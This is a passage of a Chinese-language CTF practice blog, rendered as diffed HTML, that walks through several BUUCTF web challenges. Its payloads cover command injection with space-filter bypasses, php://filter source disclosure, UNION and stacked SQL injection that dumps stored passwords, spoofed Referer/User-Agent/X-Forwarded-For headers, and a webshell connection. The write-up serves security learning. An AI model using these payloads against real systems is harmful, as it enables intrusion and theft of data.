class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;匹配未找到&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h1><span id="gxyctf2019ping-ping-ping">[GXYCTF2019]Ping Ping Ping</span></h1><p><img src="https://img-blog.csdnimg.cn/a2f91101db5941f0abb457cdff52278f.png" alt="在这里插入图片描述"><br>进入后提示了变量名为id，我们先ping本地，发现正常，尝试用管道符+ls查看文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=<span class="number">1</span>|ls</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/8128126e58ef45ee8fdd2ed4df06616d.png" alt="在这里插入图片描述">发现flag.php，尝试以获取flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=<span class="number">1</span>|cat flag.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/230707b19b2745c3881d45bd5cbb25e9.png" alt="在这里插入图片描述">看这个语句，大致是过滤了空格的意思，在这里我们采用<code>$IFS$9</code>绕过</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=<span class="number">1</span>|cat$IFS$9flag.php</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/330c9eb372e34a499e4afd4d70245da3.png" alt="在这里插入图片描述"><br>emmm，好像flag也给过滤了，那我们先查看另一个文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=<span class="number">1</span>|cat$IFS$9index.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/b0479c768e804bcb9f527f4c26bf1654.png" alt="在这里插入图片描述"></p>
+<p>可以发现过滤了很多，本来我想用include包含一个文件再查看flag实现绕过，但[]也被绕过了，没办法只好学习一下其他师傅的绕过姿势</p>
+<h2><span id="方法一">方法一</span></h2><p>利用ls和特殊符号`，这时候执行的语句就是tac查当前目录下的文件(cat文件的话需要看注释才能获取)，构造payload如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=<span class="number">1</span>|tac$IFS$<span class="number">9</span>`ls`</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/888c9fbe587f455dbcf2e6ca9eed6c3a.png" alt="在这里插入图片描述"></p>
+<h2><span id="方法二">方法二</span></h2><p>变量覆盖，设置一个变量a，另其等于g，这样就可以用fla$a来替代flag，构造payload如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=<span class="number">1</span>;a=g;tac$IFS$1fla$a.php</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/60dfbec943fa4203bbd5c38b1b567d3a.png" alt="在这里插入图片描述"></p>
+<h1><span id="极客大挑战-2019secret-file">[极客大挑战 2019]Secret File</span></h1><p><img src="https://img-blog.csdnimg.cn/074903cc1a2a4aa0bf729b49b6d508a7.png" alt="在这里插入图片描述"><br>界面没有什么东西，查源码<br><img src="https://img-blog.csdnimg.cn/1777be4a33554a6c9e08f3df84bfb2e7.png" alt="在这里插入图片描述"><br>发现文件，点击查看<br><img src="https://img-blog.csdnimg.cn/f57d4991289e426ba938c597dca992ca.png" alt="在这里插入图片描述">有用的仍然只有一个文件链接，查看<br><img src="https://img-blog.csdnimg.cn/da6a175ad89e4fa6ab6c4a3711a34392.png" alt="在这里插入图片描述"><br>发现没了，此时我也是一头雾水，但回过头来看，中间那个文件给的明明是/action.php，却跳转到了end.php，说明文件被重定向了，用bp抓action.php文件的包<br><img src="https://img-blog.csdnimg.cn/585a35dd2ee34a3b95950b0bc482db48.png" alt="在这里插入图片描述"><br>访问该文件<br><img src="https://img-blog.csdnimg.cn/0da6621f8608476fb24ddec36ef97836.png" alt="在这里插入图片描述"><br>查看一下flag.php<br><img src="https://img-blog.csdnimg.cn/b3261e2fbcc146618afb8bdb5d3c533d.png" alt="在这里插入图片描述"><br>不存在flag，回去看php文件，发现它过滤了input，data，想起来伪协议，还有一个filter没被过滤，构造payload如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://<span class="built_in">filter</span>/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+<p>执行结果<br><img src="https://img-blog.csdnimg.cn/020592e506954f138813589f058e4318.png" alt="在这里插入图片描述"><br>base64解码后<br><img src="https://img-blog.csdnimg.cn/f90bd190ebdf42b58ba7cf38c2532807.png" alt="在这里插入图片描述"><br>解题完成</p>
+<h1><span id="极客大挑战-2019lovesql">[极客大挑战 2019]LoveSQL</span></h1><p>进入靶场<br><img src="https://img-blog.csdnimg.cn/d3b47b6e4d914e44b9da5506c6365537.png" alt="在这里插入图片描述">发现是用户名登陆这种,判断注入类型</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">1</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/3fc6d73ab5724a789bed8e837e6bdb1c.png" alt="在这里插入图片描述">呃,单引号包裹的,尝试万能语句</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1#</span></span><br><span class="line"><span class="string">1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/15abf68c80964be0960097e19fc5fce3.png" alt="在这里插入图片描述">emm,这个很狗,应该是把sql语句改了,那只能按常规办法来了<br>判断字段数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; order by 4#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/46afb5bd5f3e43a6ba258164220d51a8.png" alt="在这里插入图片描述">字段数为3<br>联合查询看哪个有回显</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-<span class="number">1</span><span class="string">&#x27;union select 1,2,3#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/22ac05d2ed044f28a61117804dea0c68.png" alt="在这里插入图片描述">查库</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-<span class="number">1</span><span class="string">&#x27;union select 1,2,database()#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/3b7ed906057d4550adb1ecb68211e86d.png" alt="在这里插入图片描述">查表</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-<span class="number">1</span><span class="string">&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>geek<span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/6909b24526394d09962e82157a952556.png" alt="在这里插入图片描述">查列</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>l0ve1ysq1<span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/6923a1bb5ebf41c9a4837909429e3e43.png" alt="在这里插入图片描述">查字段信息</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-<span class="number">1</span><span class="string">&#x27;union select 1,2,group_concat(password) from l0ve1ysq1 #</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/eb9d1d30716246e0a059139943f5edef.png" alt="在这里插入图片描述"><br>解题完成</p>
+<h1><span id="极客大挑战-2019http">[极客大挑战 2019]Http</span></h1><p>进入靶场<br><img src="https://img-blog.csdnimg.cn/7a17a8efe1c34425bb7db4ecff4d52e5.png" alt="在这里插入图片描述"><br>没有找到什么可用信息，查看源码<br><img src="https://img-blog.csdnimg.cn/9d92a6c2b17645c7b4b3b133102d60f2.png" alt="在这里插入图片描述"><br>发现一个隐藏文件，访问一下<br><img src="https://img-blog.csdnimg.cn/8d7027a80f5546efaa415e67ed85a5a5.png" alt="在这里插入图片描述"><br>提示不是来自这个网址的，http中有一个<code>Referer</code>，在这里简单科普一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Referer是HTTP请求header的一部分</span><br><span class="line">Referer字段实际上告诉了服务器，用户在访问当前资源之前的位置。这往往可以用来用户跟踪。</span><br></pre></td></tr></table></figure>
+<p>因此我们可以指定Referer为这个网址，利用hackbar插件或者bp都可以<br><img src="https://img-blog.csdnimg.cn/4ec3ee27cf2849f89e30a5e17aff2062.png" alt="在这里插入图片描述"></p>
+<p>此时提示用 Syclover来浏览，修改UA，科普一下</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">User</span>-Agent 即用户代理，简称“UA”，它是一个特殊字符串头。网站服务器通过识别 “UA”来确定用户</span><br><span class="line">所使用的操作系统版本、CPU 类型、浏览器版本等信息。而网站服务器则通过判断 UA 来给客户端发送</span><br><span class="line">不同的页面。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/d347b81cacc84393b6b4a6f9132de26a.png" alt="在这里插入图片描述"><br>此时提示只能本地访问，我们可以用xff伪造本机回环地址，科普一下</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始</span><br><span class="line">的<span class="built_in">IP</span>地址的HTTP请求头字段</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/69d8d764dee7474f9d236315b7f13d9f.png" alt="在这里插入图片描述">得到flag，解题完成</p>
+<h1><span id="极客大挑战-2019knife">[极客大挑战 2019]Knife</span></h1><p><img src="https://img-blog.csdnimg.cn/c0c2edad2d1b47b59ea378656696d226.png" alt="在这里插入图片描述"><br>长得真像一句话木马，还丢菜刀，一看就是让用菜刀来获取webshell，哎，我偏不用菜刀，用蚁剑，就是玩<br>以Syc作为密码进行连接<br><img src="https://img-blog.csdnimg.cn/e1020b9ab52344e5a3499df773679f29.png" alt="在这里插入图片描述">在根目录下找到flag<br><img src="https://img-blog.csdnimg.cn/4f2925e34cec491986dd0d9bcb7af16b.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/abbe1f87e8ae4765a53ec73484b13718.png" alt="在这里插入图片描述"><br>解题完成</p>
+<h1><span id="suctf-2019easysql">[SUCTF 2019]EasySQL</span></h1><p>进入靶场<br><img src="https://img-blog.csdnimg.cn/543859f919524468b7e3f129adeae606.png" alt="在这里插入图片描述"><br>发现这种模式有点像堆叠注入，不确定，先用fuzz查一下有没有过滤掉的函数，具体操作如下<br>用bp抓包，发送到爆破模块，清除变量，在给query后添加一个变量<br><img src="https://img-blog.csdnimg.cn/53b2758346ba4467bde24cb50c04a306.png" alt="在这里插入图片描述">在payloads中使用bp的fuzz字典进行爆破，或者使用自己的<br><img src="https://img-blog.csdnimg.cn/ff089f36800840a0b2eaaff057e8f8bb.png" alt="在这里插入图片描述"><br>跑完后发现数据分三种<br>第一种是没有任何回显的，说明应该是没被过滤的<br><img src="https://img-blog.csdnimg.cn/4d7b5eb493af48258ed5b858e6f130e7.png" alt="在这里插入图片描述">第二种返回了nonono，这种应该是被过滤掉了<br><img src="https://img-blog.csdnimg.cn/c75d8c0c73f74dc586d12e5e1838307b.png" alt="在这里插入图片描述"><br>第三种是返回了数据，这个也不知道有啥用，先记着<br><img src="https://img-blog.csdnimg.cn/afb899ba64864c4e889733e2d2a40c30.png" alt="在这里插入图片描述"><br>此时我们所用的方法不多，select被过滤了，联合查询没法用，报错注入用的函数也被过滤了，尝试一下堆叠注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>;<span class="keyword">show</span> databases;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/fe515cdfcc2748bd862eeb899cbb281c.png" alt="在这里插入图片描述"><br>可行，emm，那继续注，查表</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>;<span class="keyword">show</span> tables;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/8d21bb56515f4ecd849d3e9bb985acff.png" alt="在这里插入图片描述">OHHHHHH，Flag表，那是不是flag就在这里呢，尝试查看一下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>;<span class="keyword">select</span> flag <span class="keyword">from</span> Flag;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/e4e6b7193e9f46bf922613881ab9a123.png" alt="在这里插入图片描述"><br>emmm,果然，不会让我们这么轻易的得到flag，flag被过滤了<br>此时再看一下最上面，他说输入flag，它来判断对不对，那他肯定是从有flag的表中查的，再看我们刚刚获取的表，那不就是Flag，那他后端sql语句此时肯定就是一个<code>select flag from Flag</code>这样子，但是还要检测我们的数据，那它肯定是<code>select post[xxx] </code>这样子，再把这俩结合一下，肯定不能用&amp;&amp;，那还剩的就是||，因此后端语句就是<code>select post[xxx] || flag from Flag</code>,知道后端语句的话，那解题不就易如反掌，方法有以下两种</p>
+<h2><span id="方法一">方法一</span></h2><p>sql中有一种方法可以使||变成拼接符，如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> sql_mode<span class="operator">=</span>PIPES_AS_CONCAT;</span><br></pre></td></tr></table></figure>
+<p>因此我们可以构造payload如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>;<span class="keyword">set</span> sql_mode<span class="operator">=</span>PIPES_AS_CONCAT;<span class="keyword">select</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>后端的语句就是</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">3</span>;<span class="keyword">set</span> sql_mode<span class="operator">=</span>PIPES_AS_CONCAT;<span class="operator">||</span><span class="keyword">select</span> <span class="number">3</span>flag <span class="keyword">from</span> Flag</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>字母前面的数字没啥影响，会跟着回显到界面上</span><br></pre></td></tr></table></figure>
+<p>执行结果<img src="https://img-blog.csdnimg.cn/0b31b7649a41475aa7d1fed6e8c6e55a.png" alt="在这里插入图片描述"></p>
+<h2><span id="方法二">方法二</span></h2><p>构造payload如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">*</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>此时后端语句就是</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span>，<span class="number">1</span><span class="operator">||</span>flag <span class="keyword">from</span> Flag</span><br><span class="line">,用于查询多个数据</span><br><span class="line">第一个<span class="keyword">select</span> <span class="operator">*</span>就可以查出来flag</span><br><span class="line">第二个<span class="number">1</span><span class="operator">||</span>flag 执行结果为<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>执行结果<img src="https://img-blog.csdnimg.cn/693328089a404c17bd346e003c1678c8.png" alt="在这里插入图片描述"><br>解题完成</p>
+
+      
+    </div>
+    
+    
+    
+     
+   <div>
+     <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:24px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+   </div>
+ 
+
+<div>
+      
+        
+      
+</div>
+
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.png" alt=" 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.png" alt=" 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+      
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    quan9i
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://quan9i.top/buuctf1/" title="buuctf一天小练习">https://quan9i.top/buuctf1/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E5%88%B7%E9%A2%98/" rel="tag"><i class="fa fa-tag"></i> 刷题</a>
+          
+        </div>
+      
+
+      
+      
+        <div class="post-widgets">
+        
+
+        
+
+        
+          
+          <div id="needsharebutton-postbottom">
+            <span class="btn">
+              <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </span>
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/twofen/" rel="next" title="sql二进制学习">
+                <i class="fa fa-chevron-left"></i> sql二进制学习
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/2.jpeg"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">37</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/%5Bobject%20Object%5D" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://blog.csdn.net/Reme_mber" target="_blank" title="CSDN">
+                      
+                        <i class="fa fa-fw fa-gg-circle"></i>CSDN</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://wpa.qq.com/msgrd?v=3&uin=1537969147&site=qq&menu=yes" target="_blank" title="QQ">
+                      
+                        <i class="fa fa-fw fa-qq"></i>QQ</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/quan9i" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:shijishangjieke@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=450 src="//music.163.com/outchain/player?type=0&id=7220329972&auto=0&height=430"></iframe>
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">2.</span> <span class="nav-text">[极客大挑战 2019]EasySQL</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">3.</span> <span class="nav-text">[HCTF 2018]WarmUp</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">4.</span> <span class="nav-text">[GXYCTF2019]Ping Ping Ping</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">4.1.</span> <span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">4.2.</span> <span class="nav-text">方法二</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">5.</span> <span class="nav-text">[极客大挑战 2019]Secret File</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">6.</span> <span class="nav-text">[极客大挑战 2019]LoveSQL</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">7.</span> <span class="nav-text">[极客大挑战 2019]Http</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">8.</span> <span class="nav-text">[极客大挑战 2019]Knife</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">9.</span> <span class="nav-text">[SUCTF 2019]EasySQL</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">9.1.</span> <span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">9.2.</span> <span class="nav-text">方法二</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+
+
+  <div class="links-of-blogroll motion-element links-of-blogroll-block">
+    <div class="links-of-blogroll-title">
+      <!-- modify icon to fire by szw -->
+      <i class="fa fa-history fa-" aria-hidden="true"></i>
+      近期文章
+    </div>
+    <ul class="links-of-blogroll-list">
+      
+      
+        <li class="recent_posts_li">
+          <a href="/buuctf1/" title="buuctf一天小练习" target="_blank">buuctf一天小练习</a>
+        </li>
+      
+        <li class="recent_posts_li">
+          <a href="/twofen/" title="sql二进制学习" target="_blank">sql二进制学习</a>
+        </li>
+      
+        <li class="recent_posts_li">
+          <a href="/sqlway/" title="sql注入的部分注入方式" target="_blank">sql注入的部分注入方式</a>
+        </li>
+      
+        <li class="recent_posts_li">
+          <a href="/sqlprotect/" title="浅谈防御sql注入" target="_blank">浅谈防御sql注入</a>
+        </li>
+      
+        <li class="recent_posts_li">
+          <a href="/command2/" title="浅析命令执行" target="_blank">浅析命令执行</a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+
+
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script
+  async
+  src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"
+></script>
+
+<div class="copyright">&copy; 2021-11 &mdash; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">quan9i</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">59.9k</span>
+  
+</div>
+
+
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date(); 
+    function createtime() { 
+        var grt= new Date("11/12/2021 12:49:00");//此处修改你的建站时间或者网站上线时间 
+        now.setTime(now.getTime()+250); 
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 "; 
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+    } 
+setInterval("createtime()",250);
+</script>
+
+
+
+
+
+
+
+
+
+
+        
+  
+-   <span class="site-uv" title="我的第 undefined 位朋友">
++   <span class="site-uv">
++     我的第 <span class="busuanzi-value" id="busuanzi_value_site_uv"></span> 位朋友
+-     <i class="fa fa-heart"></i>
+-     <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+-   <span class="site-pv" title="历经 undefined 次回眸才与你相遇">
++   <span class="site-pv">
++     历经 <span class="busuanzi-value" id="busuanzi_value_site_pv"></span> 次回眸才与你相遇
+-     <i class="fa fa-heart"></i>
+-     <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+      <div id="needsharebutton-float">
+        <span class="btn">
+          <i class="fa fa-share-alt" aria-hidden="true"></i>
+        </span>
+      </div>
+    
+
+  </div>
+
+
+
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
